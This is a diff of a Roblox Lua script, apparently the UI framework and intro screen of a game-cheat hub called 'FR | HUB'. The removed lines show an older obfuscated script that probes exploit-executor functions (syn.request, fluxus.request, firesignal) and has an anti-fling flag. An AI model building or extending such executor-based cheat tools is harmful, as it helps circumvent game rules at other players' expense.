+			function Toggle:Visible(...) Funcs:ToggleVisible(Button, ...) end
+			function Toggle:Destroy() Button:Destroy() end
+			function Toggle:Callback(...) Funcs:InsertCallback(Callback, ...)() end
+			function Toggle:Set(Val1, Val2)
+				if type(Val1) == "string" and type(Val2) == "string" then
+					LabelFunc:SetTitle(Val1)
+					LabelFunc:SetDesc(Val2)
+				elseif type(Val1) == "string" then
+					LabelFunc:SetTitle(Val1, false, true)
+				elseif type(Val1) == "boolean" then
+					if WaitClick and Val2 then
+						repeat task.wait() until not WaitClick
+					end
+					task.spawn(SetToggle, Val1)
+				elseif type(Val1) == "function" then
+					Callback = Val1
+				end
+			end
+			return Toggle
+		end
+		function Tab:AddDropdown(Configs)
+			local DName = Configs[1] or Configs.Name or Configs.Title or "Dropdown"
+			local DDesc = Configs.Desc or Configs.Description or ""
+			local DOptions = Configs[2] or Configs.Options or {}
+			local OpDefault = Configs[3] or Configs.Default or {}
+			local Flag = Configs[5] or Configs.Flag or false
+			local DMultiSelect = Configs.MultiSelect or false
+			local Callback = Funcs:GetCallback(Configs, 4)
+			
+			local Button, LabelFunc = ButtonFrame(Container, DName, DDesc, UDim2.new(1, -180))
+			
+			local SelectedFrame = InsertTheme(Create("Frame", Button, {
+				Size = UDim2.new(0, 150, 0, 18),
+				Position = UDim2.new(1, -10, 0.5),
+				AnchorPoint = Vector2.new(1, 0.5),
+				BackgroundColor3 = Theme["Color Stroke"]
+			}), "Stroke")Make("Corner", SelectedFrame, UDim.new(0, 4))
+			
+			local ActiveLabel = InsertTheme(Create("TextLabel", SelectedFrame, {
+				Size = UDim2.new(0.85, 0, 0.85, 0),
+				AnchorPoint = Vector2.new(0.5, 0.5),
+				Position = UDim2.new(0.5, 0, 0.5, 0),
+				BackgroundTransparency = 1,
+				Font = Enum.Font.GothamBold,
+				TextScaled = true,
+				TextColor3 = Theme["Color Text"],
+				Text = "..."
+			}), "Text")
+			
+			local Arrow = Create("ImageLabel", SelectedFrame, {
+				Size = UDim2.new(0, 15, 0, 15),
+				Position = UDim2.new(0, -5, 0.5),
+				AnchorPoint = Vector2.new(1, 0.5),
+				Image = "rbxassetid://10709791523",
+				BackgroundTransparency = 1
+			})
+			
+			local NoClickFrame = Create("TextButton", DropdownHolder, {
+				Name = "AntiClick",
+				Size = UDim2.new(1, 0, 1, 0),
+				BackgroundTransparency = 1,
+				Visible = false,
+				Text = ""
+			})
+			
+			local DropFrame = Create("Frame", NoClickFrame, {
+				Size = UDim2.new(SelectedFrame.Size.X, 0, 0),
+				BackgroundTransparency = 0.1,
+				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+				AnchorPoint = Vector2.new(0, 1),
+				Name = "DropdownFrame",
+				ClipsDescendants = true,
+				Active = true
+			})Make("Corner", DropFrame)Make("Stroke", DropFrame)Make("Gradient", DropFrame, {Rotation = 60})
+			
+			local ScrollFrame = InsertTheme(Create("ScrollingFrame", DropFrame, {
+				ScrollBarImageColor3 = Theme["Color Theme"],
+				Size = UDim2.new(1, 0, 1, 0),
+				ScrollBarThickness = 1.5,
+				BackgroundTransparency = 1,
+				BorderSizePixel = 0,
+				CanvasSize = UDim2.new(),
+				ScrollingDirection = "Y",
+				AutomaticCanvasSize = "Y",
+				Active = true
+			}, {
+				Create("UIPadding", {
+					PaddingLeft = UDim.new(0, 8),
+					PaddingRight = UDim.new(0, 8),
+					PaddingTop = UDim.new(0, 5),
+					PaddingBottom = UDim.new(0, 5)
+				}), Create("UIListLayout", {
+					Padding = UDim.new(0, 4)
+				})
+			}), "ScrollBar")
+			
+			local ScrollSize, WaitClick = 5
+			local function Disable()
+				WaitClick = true
+				CreateTween({Arrow, "Rotation", 0, 0.2})
+				CreateTween({DropFrame, "Size", UDim2.new(0, 152, 0, 0), 0.2, true})
+				CreateTween({Arrow, "ImageColor3", Color3.fromRGB(255, 255, 255), 0.2})
+				Arrow.Image = "rbxassetid://10709791523"
+				NoClickFrame.Visible = false
+				WaitClick = false
+			end
+			
+			local function GetFrameSize()
+				return UDim2.fromOffset(152, ScrollSize)
+			end
+			
+			local function CalculateSize()
+				local Count = 0
+				for _,Frame in pairs(ScrollFrame:GetChildren()) do
+					if Frame:IsA("Frame") or Frame.Name == "Option" then
+						Count = Count + 1
+					end
+				end
+				ScrollSize = (math.clamp(Count, 0, 10) * 25) + 10
+				if NoClickFrame.Visible then
+					NoClickFrame.Visible = true
+					CreateTween({DropFrame, "Size", GetFrameSize(), 0.2, true})
+				end
+			end
+			
+			local function Minimize()
+				if WaitClick then return end
+				WaitClick = true
+				if NoClickFrame.Visible then
+					Arrow.Image = "rbxassetid://10709791523"
+					CreateTween({Arrow, "ImageColor3", Color3.fromRGB(255, 255, 255), 0.2})
+					CreateTween({DropFrame, "Size", UDim2.new(0, 152, 0, 0), 0.2, true})
+					NoClickFrame.Visible = false
+				else
+					NoClickFrame.Visible = true
+					Arrow.Image = "rbxassetid://10709790948"
+					CreateTween({Arrow, "ImageColor3", Theme["Color Theme"], 0.2})
+					CreateTween({DropFrame, "Size", GetFrameSize(), 0.2, true})
+				end
+				WaitClick = false
+			end
+			
+			local function CalculatePos()
+				local FramePos = SelectedFrame.AbsolutePosition
+				local ScreenSize = ScreenGui.AbsoluteSize
+				local ClampX = math.clamp((FramePos.X / UIScale), 0, ScreenSize.X / UIScale - DropFrame.Size.X.Offset)
+				local ClampY = math.clamp((FramePos.Y / UIScale) , 0, ScreenSize.Y / UIScale)
+				
+				local NewPos = UDim2.fromOffset(ClampX, ClampY)
+				local AnchorPoint = FramePos.Y > ScreenSize.Y / 1.4 and 1 or ScrollSize > 80 and 0.5 or 0
+				DropFrame.AnchorPoint = Vector2.new(0, AnchorPoint)
+				CreateTween({DropFrame, "Position", NewPos, 0.1})
+			end
+			
+			local AddNewOptions, GetOptions, AddOption, RemoveOption, Selected do
+				local Default = type(OpDefault) ~= "table" and {OpDefault} or OpDefault
+				local MultiSelect = DMultiSelect
+				local Options = {}
+				Selected = MultiSelect and {} or CheckFlag(Flag) and GetFlag(Flag) or Default[1]
+				
+				if MultiSelect then
+					for index, Value in pairs(CheckFlag(Flag) and GetFlag(Flag) or Default) do
+						if type(index) == "string" and (DOptions[index] or table.find(DOptions, index)) then
+							Selected[index] = Value
+						elseif DOptions[Value] then
+							Selected[Value] = true
+						end
+					end
+				end
+				
+				local function CallbackSelected()
+					SetFlag(Flag, MultiSelect and Selected or tostring(Selected))
+					Funcs:FireCallback(Callback, Selected)
+				end
+				
+				local function UpdateLabel()
+					if MultiSelect then
+						local list = {}
+						for index, Value in pairs(Selected) do
+							if Value then
+								table.insert(list, index)
+							end
+						end
+						ActiveLabel.Text = #list > 0 and table.concat(list, ", ") or "..."
+					else
+						ActiveLabel.Text = tostring(Selected or "...")
+					end
+				end
+				
+				local function UpdateSelected()
+					if MultiSelect then
+						for _,v in pairs(Options) do
+							local nodes, Stats = v.nodes, v.Stats
+							CreateTween({nodes[2], "BackgroundTransparency", Stats and 0 or 0.8, 0.35})
+							CreateTween({nodes[2], "Size", Stats and UDim2.fromOffset(4, 12) or UDim2.fromOffset(4, 4), 0.35})
+							CreateTween({nodes[3], "TextTransparency", Stats and 0 or 0.4, 0.35})
+						end
+					else
+						for _,v in pairs(Options) do
+							local Slt = v.Value == Selected
+							local nodes = v.nodes
+							CreateTween({nodes[2], "BackgroundTransparency", Slt and 0 or 1, 0.35})
+							CreateTween({nodes[2], "Size", Slt and UDim2.fromOffset(4, 14) or UDim2.fromOffset(4, 4), 0.35})
+							CreateTween({nodes[3], "TextTransparency", Slt and 0 or 0.4, 0.35})
+						end
+					end
+					UpdateLabel()
+				end
+				
+				local function Select(Option)
+					if MultiSelect then
+						Option.Stats = not Option.Stats
+						Option.LastCB = tick()
+						
+						Selected[Option.Name] = Option.Stats
+						CallbackSelected()
+					else
+						Option.LastCB = tick()
+						
+						Selected = Option.Value
+						CallbackSelected()
+					end
+					UpdateSelected()
+				end
+				
+				AddOption = function(index, Value)
+					local Name = tostring(type(index) == "string" and index or Value)
+					
+					if Options[Name] then return end
+					Options[Name] = {
+						index = index,
+						Value = Value,
+						Name = Name,
+						Stats = false,
+						LastCB = 0
+					}
+					
+					if MultiSelect then
+						local Stats = Selected[Name]
+						Selected[Name] = Stats or false
+						Options[Name].Stats = Stats
+					end
+					
+					local Button = Make("Button", ScrollFrame, {
+						Name = "Option",
+						Size = UDim2.new(1, 0, 0, 21),
+						Position = UDim2.new(0, 0, 0.5),
+						AnchorPoint = Vector2.new(0, 0.5)
+					})Make("Corner", Button, UDim.new(0, 4))
+					
+					local IsSelected = InsertTheme(Create("Frame", Button, {
+						Position = UDim2.new(0, 1, 0.5),
+						Size = UDim2.new(0, 4, 0, 4),
+						BackgroundColor3 = Theme["Color Theme"],
+						BackgroundTransparency = 1,
+						AnchorPoint = Vector2.new(0, 0.5)
+					}), "Theme")Make("Corner", IsSelected, UDim.new(0.5, 0))
+					
+					local OptioneName = InsertTheme(Create("TextLabel", Button, {
+						Size = UDim2.new(1, 0, 1),
+						Position = UDim2.new(0, 10),
+						Text = Name,
+						TextColor3 = Theme["Color Text"],
+						Font = Enum.Font.FredokaOne, --GothamBold
+						TextXAlignment = "Left",
+						BackgroundTransparency = 1,
+						TextTransparency = 0.4
+					}), "Text")
+					
+					Button.Activated:Connect(function()
+						Select(Options[Name])
+					end)
+					
+					Options[Name].nodes = {Button, IsSelected, OptioneName}
+				end
+				
+				RemoveOption = function(index, Value)
+					local Name = tostring(type(index) == "string" and index or Value)
+					if Options[Name] then
+						if MultiSelect then Selected[Name] = nil else Selected = nil end
+						Options[Name].nodes[1]:Destroy()
+						table.clear(Options[Name])
+						Options[Name] = nil
+					end
+				end
+				
+				GetOptions = function()
+					return Options
+				end
+				
+				AddNewOptions = function(List, Clear)
+					if Clear then
+						table.foreach(Options, RemoveOption)
+					end
+					table.foreach(List, AddOption)
+					CallbackSelected()
+					UpdateSelected()
+				end
+				
+				table.foreach(DOptions, AddOption)
+				CallbackSelected()
+				UpdateSelected()
+			end
+			
+			Button.Activated:Connect(Minimize)
+			NoClickFrame.MouseButton1Down:Connect(Disable)
+			NoClickFrame.MouseButton1Click:Connect(Disable)
+			MainFrame:GetPropertyChangedSignal("Visible"):Connect(Disable)
+			SelectedFrame:GetPropertyChangedSignal("AbsolutePosition"):Connect(CalculatePos)
+			
+			Button.Activated:Connect(CalculateSize)
+			ScrollFrame.ChildAdded:Connect(CalculateSize)
+			ScrollFrame.ChildRemoved:Connect(CalculateSize)
+			CalculatePos()
+			CalculateSize()
+			
+			local Dropdown = {}
+			function Dropdown:Visible(...) Funcs:ToggleVisible(Button, ...) end
+			function Dropdown:Destroy() Button:Destroy() end
+			function Dropdown:Callback(...) Funcs:InsertCallback(Callback, ...)(Selected) end
+			
+			function Dropdown:Add(...)
+				local NewOptions = {...}
+				if type(NewOptions[1]) == "table" then
+					table.foreach(Option, function(_,Name)
+						AddOption(Name)
+					end)
+				else
+					table.foreach(NewOptions, function(_,Name)
+						AddOption(Name)
+					end)
+				end
+			end
+			function Dropdown:Remove(Option)
+				for index, Value in pairs(GetOptions()) do
+					if type(Option) == "number" and index == Option or Value.Name == "Option" then
+						RemoveOption(index, Value.Value)
+					end
+				end
+			end
+			function Dropdown:Select(Option)
+				if type(Option) == "string" then
+					for _,Val in pairs(Options) do
+						if Val.Name == Option then
+							Val.Active()
+						end
+					end
+				elseif type(Option) == "number" then
+					for ind,Val in pairs(Options) do
+						if ind == Option then
+							Val.Active()
+						end
+					end
+				end
+			end
+			function Dropdown:Set(Val1, Clear)
+				if type(Val1) == "table" then
+					AddNewOptions(Val1, not Clear)
+				elseif type(Val1) == "function" then
+					Callback = Val1
+				end
+			end
+			return Dropdown
+		end
+		function Tab:AddSlider(Configs)
+			local SName = Configs[1] or Configs.Name or Configs.Title or "Slider!"
+			local SDesc = Configs.Desc or Configs.Description or ""
+			local Min = Configs[2] or Configs.MinValue or Configs.Min or 10
+			local Max = Configs[3] or Configs.MaxValue or Configs.Max or 100
+			local Increase = Configs[4] or Configs.Increase or 1
+			local Callback = Funcs:GetCallback(Configs, 6)
+			local Flag = Configs[7] or Configs.Flag or false
+			local Default = Configs[5] or Configs.Default or 25
+			if CheckFlag(Flag) then Default = GetFlag(Flag) end
+			Min, Max = Min / Increase, Max / Increase
+			
+			local Button, LabelFunc = ButtonFrame(Container, SName, SDesc, UDim2.new(1, -180))
+			
+			local SliderHolder = Create("TextButton", Button, {
+				Size = UDim2.new(0.45, 0, 1),
+				Position = UDim2.new(1),
+				AnchorPoint = Vector2.new(1, 0),
+				AutoButtonColor = false,
+				Text = "",
+				BackgroundTransparency = 1
+			})
+			
+			local SliderBar = InsertTheme(Create("Frame", SliderHolder, {
+				BackgroundColor3 = Theme["Color Stroke"],
+				Size = UDim2.new(1, -20, 0, 6),
+				Position = UDim2.new(0.5, 0, 0.5),
+				AnchorPoint = Vector2.new(0.5, 0.5)
+			}), "Stroke")Make("Corner", SliderBar)
+			
+			local Indicator = InsertTheme(Create("Frame", SliderBar, {
+				BackgroundColor3 = Theme["Color Theme"],
+				Size = UDim2.fromScale(0.3, 1),
+				BorderSizePixel = 0
+			}), "Theme")Make("Corner", Indicator)
+			
+			local SliderIcon = Create("Frame", SliderBar, {
+				Size = UDim2.new(0, 6, 0, 12),
+				BackgroundColor3 = Color3.fromRGB(220, 220, 220),
+				Position = UDim2.fromScale(0.3, 0.5),
+				AnchorPoint = Vector2.new(0.5, 0.5),
+				BackgroundTransparency = 0.2
+			})Make("Corner", SliderIcon)
+			
+			local LabelVal = InsertTheme(Create("TextLabel", SliderHolder, {
+				Size = UDim2.new(0, 14, 0, 14),
+				AnchorPoint = Vector2.new(1, 0.5),
+				Position = UDim2.new(0, 0, 0.5),
+				BackgroundTransparency = 1,
+				TextColor3 = Theme["Color Text"],
+				Font = Enum.Font.FredokaOne,
+				TextSize = 12
+			}), "Text")
+			
+			local UIScale = Create("UIScale", LabelVal)
+			
+			local BaseMousePos = Create("Frame", SliderBar, {
+				Position = UDim2.new(0, 0, 0.5, 0),
+				Visible = false
+			})
+			
+			local function UpdateLabel(NewValue)
+				local Number = tonumber(NewValue * Increase)
+				Number = math.floor(Number * 100) / 100
+				
+				Default, LabelVal.Text = Number, tostring(Number)
+				Funcs:FireCallback(Callback, Default)
+			end
+			
+			local function ControlPos()
+				local MousePos = Player:GetMouse()
+				local APos = MousePos.X - BaseMousePos.AbsolutePosition.X
+				local ConfigureDpiPos = APos / SliderBar.AbsoluteSize.X
+				
+				SliderIcon.Position = UDim2.new(math.clamp(ConfigureDpiPos, 0, 1), 0, 0.5, 0)
+			end
+			
+			local function UpdateValues()
+				Indicator.Size = UDim2.new(SliderIcon.Position.X.Scale, 0, 1, 0)
+				local SliderPos = SliderIcon.Position.X.Scale
+				local NewValue = math.floor(((SliderPos * Max) / Max) * (Max - Min) + Min)
+				UpdateLabel(NewValue)
+			end
+			
+			SliderHolder.MouseButton1Down:Connect(function()
+				CreateTween({SliderIcon, "Transparency", 0, 0.3})
+				Container.ScrollingEnabled = false
+				while UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do task.wait()
+					ControlPos()
+				end
+				CreateTween({SliderIcon, "Transparency", 0.2, 0.3})
+				Container.ScrollingEnabled = true
+				SetFlag(Flag, Default)
+			end)
+			
+			LabelVal:GetPropertyChangedSignal("Text"):Connect(function()
+				UIScale.Scale = 0.3
+				CreateTween({UIScale, "Scale", 1.2, 0.1})
+				CreateTween({LabelVal, "Rotation", math.random(-1, 1) * 5, 0.15, true})
+				CreateTween({UIScale, "Scale", 1, 0.2})
+				CreateTween({LabelVal, "Rotation", 0, 0.1})
+			end)
+			
+			function SetSlider(NewValue)
+				if type(NewValue) ~= "number" then return end
+				
+				local Min, Max = Min * Increase, Max * Increase
+				
+				local SliderPos = (NewValue - Min) / (Max - Min)
+				
+				SetFlag(Flag, NewValue)
+				CreateTween({ SliderIcon, "Position", UDim2.fromScale(math.clamp(SliderPos, 0, 1), 0.5), 0.3, true })
+			end;SetSlider(Default)
+			
+			SliderIcon:GetPropertyChangedSignal("Position"):Connect(UpdateValues)UpdateValues()
+			
+			local Slider = {}
+			function Slider:Set(NewVal1, NewVal2)
+				if NewVal1 and NewVal2 then
+					LabelFunc:SetTitle(NewVal1)
+					LabelFunc:SetDesc(NewVal2)
+				elseif type(NewVal1) == "string" then
+					LabelFunc:SetTitle(NewVal1)
+				elseif type(NewVal1) == "function" then
+					Callback = NewVal1
+				elseif type(NewVal1) == "number" then
+					SetSlider(NewVal1)
+				end
+			end
+			function Slider:Callback(...) Funcs:InsertCallback(Callback, ...)(tonumber(Default)) end
+			function Slider:Visible(...) Funcs:ToggleVisible(Button, ...) end
+			function Slider:Destroy() Button:Destroy() end
+			return Slider
+		end
+		function Tab:AddTextBox(Configs)
+			local TName = Configs[1] or Configs.Name or Configs.Title or "Text Box"
+			local TDesc = Configs.Desc or Configs.Description or ""
+			local TDefault = Configs[2] or Configs.Default or ""
+			local TPlaceholderText = Configs[5] or Configs.PlaceholderText or "Input"
+			local TClearText = Configs[3] or Configs.ClearText or false
+			local Callback = Funcs:GetCallback(Configs, 4)
+			
+			if type(TDefault) ~= "string" or TDefault:gsub(" ", ""):len() < 1 then
+				TDefault = false
+			end
+			
+			local Button, LabelFunc = ButtonFrame(Container, TName, TDesc, UDim2.new(1, -38))
+			
+			local SelectedFrame = InsertTheme(Create("Frame", Button, {
+				Size = UDim2.new(0, 150, 0, 18),
+				Position = UDim2.new(1, -10, 0.5),
+				AnchorPoint = Vector2.new(1, 0.5),
+				BackgroundColor3 = Theme["Color Stroke"]
+			}), "Stroke")Make("Corner", SelectedFrame, UDim.new(0, 4))
+			
+			local TextBoxInput = InsertTheme(Create("TextBox", SelectedFrame, {
+				Size = UDim2.new(0.85, 0, 0.85, 0),
+				AnchorPoint = Vector2.new(0.5, 0.5),
+				Position = UDim2.new(0.5, 0, 0.5, 0),
+				BackgroundTransparency = 1,
+				Font = Enum.Font.GothamBold,
+				TextScaled = true,
+				TextColor3 = Theme["Color Text"],
+				ClearTextOnFocus = TClearText,
+				PlaceholderText = TPlaceholderText,
+				Text = ""
+			}), "Text")
+			
+			local Pencil = Create("ImageLabel", SelectedFrame, {
+				Size = UDim2.new(0, 12, 0, 12),
+				Position = UDim2.new(0, -5, 0.5),
+				AnchorPoint = Vector2.new(1, 0.5),
+				Image = "rbxassetid://15637081879",
+				BackgroundTransparency = 1
+			})
+			
+			local TextBox = {}
+			local function Input()
+				local Text = TextBoxInput.Text
+				if Text:gsub(" ", ""):len() > 0 then
+					if TextBox.OnChanging then Text = TextBox.OnChanging(Text) or Text end
+					Funcs:FireCallback(Callback, Text)
+					TextBoxInput.Text = Text
+				end
+			end
+			
+			TextBoxInput.FocusLost:Connect(Input)Input()
+			
+			TextBoxInput.FocusLost:Connect(function()
+				CreateTween({Pencil, "ImageColor3", Color3.fromRGB(255, 255, 255), 0.2})
+			end)
+			TextBoxInput.Focused:Connect(function()
+				CreateTween({Pencil, "ImageColor3", Theme["Color Theme"], 0.2})
+			end)
+			
+			TextBox.OnChanging = false
+			function TextBox:Visible(...) Funcs:ToggleVisible(Button, ...) end
+			function TextBox:Destroy() Button:Destroy() end
+			return TextBox
+		end
+		function Tab:AddDiscordInvite(Configs)
+			local Title = Configs[1] or Configs.Name or Configs.Title or "Discord"
+			local Desc = Configs.Desc or Configs.Description or ""
+			local Logo = Configs[2] or Configs.Logo or ""
+			local Invite = Configs[3] or Configs.Invite or ""
+			
+			local InviteHolder = Create("Frame", Container, {
+				Size = UDim2.new(1, 0, 0, 80),
+				Name = "Option",
+				BackgroundTransparency = 1
+			})
+			
+			local InviteLabel = Create("TextLabel", InviteHolder, {
+				Size = UDim2.new(1, 0, 0, 15),
+				Position = UDim2.new(0, 5),
+				TextColor3 = Color3.fromRGB(40, 150, 255),
+				Font = Enum.Font.GothamBold,
+				TextXAlignment = "Left",
+				BackgroundTransparency = 1,
+				TextSize = 10,
+				Text = Invite
+			})
+			
+			local FrameHolder = InsertTheme(Create("Frame", InviteHolder, {
+				Size = UDim2.new(1, 0, 0, 65),
+				AnchorPoint = Vector2.new(0, 1),
+				Position = UDim2.new(0, 0, 1),
+				BackgroundColor3 = Theme["Color Hub 2"]
+			}), "Frame")Make("Corner", FrameHolder)
+			
+			local ImageLabel = Create("ImageLabel", FrameHolder, {
+				Size = UDim2.new(0, 30, 0, 30),
+				Position = UDim2.new(0, 7, 0, 7),
+				Image = Logo,
+				BackgroundTransparency = 1
+			})Make("Corner", ImageLabel, UDim.new(0, 4))Make("Stroke", ImageLabel)
+			
+			local LTitle = InsertTheme(Create("TextLabel", FrameHolder, {
+				Size = UDim2.new(1, -52, 0, 15),
+				Position = UDim2.new(0, 44, 0, 7),
+				Font = Enum.Font.GothamBold,
+				TextColor3 = Theme["Color Text"],
+				TextXAlignment = "Left",
+				BackgroundTransparency = 1,
+				TextSize = 10,
+				Text = Title
+			}), "Text")
+			
+			local LDesc = InsertTheme(Create("TextLabel", FrameHolder, {
+				Size = UDim2.new(1, -52, 0, 0),
+				Position = UDim2.new(0, 44, 0, 22),
+				TextWrapped = "Y",
+				AutomaticSize = "Y",
+				Font = Enum.Font.Gotham,
+				TextColor3 = Theme["Color Dark Text"],
+				TextXAlignment = "Left",
+				BackgroundTransparency = 1,
+				TextSize = 8,
+				Text = Desc
+			}), "DarkText")
+			
+			local JoinButton = Create("TextButton", FrameHolder, {
+				Size = UDim2.new(1, -14, 0, 16),
+				AnchorPoint = Vector2.new(0.5, 1),
+				Position = UDim2.new(0.5, 0, 1, -7),
+				Text = "Join",
+				Font = Enum.Font.GothamBold,
+				TextSize = 12,
+				TextColor3 = Color3.fromRGB(220, 220, 220),
+				BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+			})Make("Corner", JoinButton, UDim.new(0, 5))
+			
+			local ClickDelay
+			JoinButton.Activated:Connect(function()
+				setclipboard(Invite)
+				if ClickDelay then return end
+				
+				ClickDelay = true
+				SetProps(JoinButton, {
+					Text = "Copied to Clipboard",
+					BackgroundColor3 = Color3.fromRGB(100, 100, 100),
+					TextColor3 = Color3.fromRGB(150, 150, 150)
+				})task.wait(5)
+				SetProps(JoinButton, {
+					Text = "Join",
+					BackgroundColor3 = Color3.fromRGB(50, 150, 50),
+					TextColor3 = Color3.fromRGB(220, 220, 220)
+				})ClickDelay = false
+			end)
+			
+			local DiscordInvite = {}
+			function DiscordInvite:Destroy() InviteHolder:Destroy() end
+			function DiscordInvite:Visible(...) Funcs:ToggleVisible(InviteHolder, ...) end
+			return DiscordInvite
+		end
+		return Tab
+	end
+	
+	CloseButton.Activated:Connect(Window.CloseBtn)
+	MinimizeButton.Activated:Connect(Window.MinimizeBtn)
+
+	return Window
+end
+
+
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace         = game:GetService("Workspace")
+local LocalPlayer       = Players.LocalPlayer
+
+
+
+local function AddMatrixRain(parent, zIndex)
+    zIndex = zIndex or 1
+    local chars = {"0","1","F","R","H","U","B","8","3","7","A","Z","f","r","h"}
+    local COLS  = 28; local colW = 1/COLS; local cols = {}
+    for i = 1, COLS do
+        local col = {y=-math.random()*1.5, speed=0.0025+math.random()*0.006, len=math.random(5,15), frames={}}
+        for j = 1, col.len do
+            local lbl = Instance.new("TextLabel")
+            lbl.Size=UDim2.new(colW,-1,0,14); lbl.Position=UDim2.new((i-1)*colW,0,-0.15,0)
+            lbl.BackgroundTransparency=1; lbl.Font=Enum.Font.Code; lbl.TextSize=10
+            lbl.TextXAlignment=Enum.TextXAlignment.Center
+            lbl.Text=chars[math.random(#chars)]; lbl.TextTransparency=1; lbl.ZIndex=zIndex; lbl.Parent=parent
+            col.frames[j]=lbl
+        end
+        cols[i]=col
+    end
+    local conn = RunService.Heartbeat:Connect(function()
+        for i=1,COLS do
+            local col=cols[i]; col.y=col.y+col.speed
+            if col.y>1.25 then col.y=-0.1-math.random()*0.5; col.speed=0.0025+math.random()*0.006; col.len=math.random(5,15) end
+            for j=1,#col.frames do
+                local f=col.frames[j]; local yp=col.y-(j-1)*0.055
+                f.Position=UDim2.new((i-1)*colW,0,yp,0)
+                local vis=yp>=-0.02 and yp<=1.02
+                if not vis then f.TextTransparency=1
+                elseif j==1 then f.TextColor3=Color3.fromRGB(200,255,200); f.TextTransparency=0
+                else local a=1-(j/#col.frames); f.TextColor3=Color3.fromRGB(0,math.floor(200*a),math.floor(70*a)); f.TextTransparency=math.max(0,1-a*1.5) end
+                if math.random(1,10)==1 then f.Text=chars[math.random(#chars)] end
             end
-            wait(100)
         end
     end)
-    local vu28 = "18"
-    _G.AntiFlingToggled = false
-    local v30 = (function()
-        local v29 = {
-            {
-                r = 0,
-                g = 0,
-                b = 255,
-                r2 = 0,
-                g2 = 0,
-                b2 = 140
-            },
-            {
-                r = 255,
-                g = 0,
-                b = 0,
-                r2 = 140,
-                g2 = 0,
-                b2 = 0
-            },
-            {
-                r = 255,
-                g = 215,
-                b = 0,
-                r2 = 180,
-                g2 = 120,
-                b2 = 0
-            },
-            {
-                r = 255,
-                g = 255,
-                b = 255,
-                r2 = 150,
-                g2 = 150,
-                b2 = 150
-            },
-            {
-                r = 255,
-                g = 15,
-                b = 235,
-                r2 = 106,
-                g2 = 2,
-                b2 = 106
-            },
-            {
-                r = 127,
-                g = 255,
-                b = 189,
-                r2 = 53,
-                g2 = 106,
-                b2 = 79
-            },
-            {
-                r = 255,
-                g = 170,
-                b = 127,
-                r2 = 90,
-                g2 = 60,
-                b2 = 45
-            }
-        }
-        return v29[math.random(1, # v29)]
-    end)()
-    local vu31 = v30.r
-    local vu32 = v30.g
-    local vu33 = v30.b
-    local v34 = v30.r2
-    local v35 = v30.g2
-    local v36 = v30.b2
-    local vu37 = game:GetService("Players")
-    local vu38 = vu37.LocalPlayer
-    game:GetService("TweenService")
-    game:GetService("RunService")
-    local vu39 = game:GetService("Lighting")
-    game:GetService("HttpService")
-    if not (syn and syn.request or (http and http.request or (http_request or fluxus and fluxus.request))) then
-        local _ = request
-    end
-    local vu40 = vu38:GetMouse()
-    local vu41 = nil
-    local vu42 = 50
-    local vu43 = nil
-    local vu44 = false
-    local vu45 = {}
-    local vu46 = workspace.CurrentCamera
-    local vu47 = "TRX ON TOP"
-    local vu48 = pcall(function()
-        assert(firesignal)
+    return function() conn:Disconnect(); for _,c in pairs(cols) do for _,f in pairs(c.frames) do f:Destroy() end end end
+end
+
+
+
+local function ShowIntro(onDone)
+    local old=CoreGui:FindFirstChild("FR_HUB_Intro"); if old then old:Destroy() end
+    local sg=Instance.new("ScreenGui"); sg.Name="FR_HUB_Intro"; sg.ResetOnSpawn=false; sg.DisplayOrder=100; sg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; sg.Parent=CoreGui
+
+    local bg=Instance.new("Frame"); bg.Size=UDim2.fromScale(1,1); bg.BackgroundColor3=Color3.fromRGB(0,0,0); bg.BorderSizePixel=0; bg.ZIndex=1; bg.Parent=sg
+    local stopRain=AddMatrixRain(bg,2)
+    local dim=Instance.new("Frame"); dim.Size=UDim2.fromScale(1,1); dim.BackgroundColor3=Color3.fromRGB(0,0,0); dim.BackgroundTransparency=0.48; dim.BorderSizePixel=0; dim.ZIndex=3; dim.Parent=bg
+
+
+    
+    local logoHolder=Instance.new("Frame")
+    logoHolder.Size=UDim2.new(0,520,0,200); logoHolder.Position=UDim2.new(0.5,-260,0.04,0)
+    logoHolder.BackgroundTransparency=1; logoHolder.ZIndex=5; logoHolder.Parent=bg
+
+    
+
+    local topLine=Instance.new("Frame"); topLine.Size=UDim2.new(1,0,0,2); topLine.Position=UDim2.new(0,0,0,0)
+    topLine.BackgroundColor3=Color3.fromRGB(0,230,70); topLine.BorderSizePixel=0; topLine.ZIndex=6; topLine.Parent=logoHolder
+    
+
+    local botLine=Instance.new("Frame"); botLine.Size=UDim2.new(1,0,0,2); botLine.Position=UDim2.new(0,0,1,-2)
+    botLine.BackgroundColor3=Color3.fromRGB(0,230,70); botLine.BorderSizePixel=0; botLine.ZIndex=6; botLine.Parent=logoHolder
+
+    
+    local titleLbl=Instance.new("TextLabel")
+    titleLbl.Size=UDim2.new(1,0,0,90); titleLbl.Position=UDim2.new(0,0,0,10)
+    titleLbl.BackgroundTransparency=1; titleLbl.Text="FR | HUB"
+    titleLbl.TextColor3=Color3.fromRGB(0,255,80); titleLbl.TextSize=78
+    titleLbl.Font=Enum.Font.GothamBlack; titleLbl.TextXAlignment=Enum.TextXAlignment.Center
+    titleLbl.TextTransparency=1; titleLbl.ZIndex=7; titleLbl.Parent=logoHolder
+    
+
+    local titleShadow=Instance.new("TextLabel")
+    titleShadow.Size=UDim2.new(1,0,0,90); titleShadow.Position=UDim2.new(0,3,0,13)
+    titleShadow.BackgroundTransparency=1; titleShadow.Text="FR | HUB"
+    titleShadow.TextColor3=Color3.fromRGB(0,60,20); titleShadow.TextSize=78
+    titleShadow.Font=Enum.Font.GothamBlack; titleShadow.TextXAlignment=Enum.TextXAlignment.Center
+    titleShadow.TextTransparency=1; titleShadow.ZIndex=6; titleShadow.Parent=logoHolder
+
+    
+    local subtitleBg=Instance.new("Frame")
+    subtitleBg.Size=UDim2.new(1,-20,0,42); subtitleBg.Position=UDim2.new(0,10,0,105)
+    subtitleBg.BackgroundColor3=Color3.fromRGB(0,15,0); subtitleBg.BackgroundTransparency=0.2
+    subtitleBg.BorderSizePixel=0; subtitleBg.ZIndex=6; subtitleBg.Parent=logoHolder
+    Instance.new("UICorner",subtitleBg).CornerRadius=UDim.new(0,6)
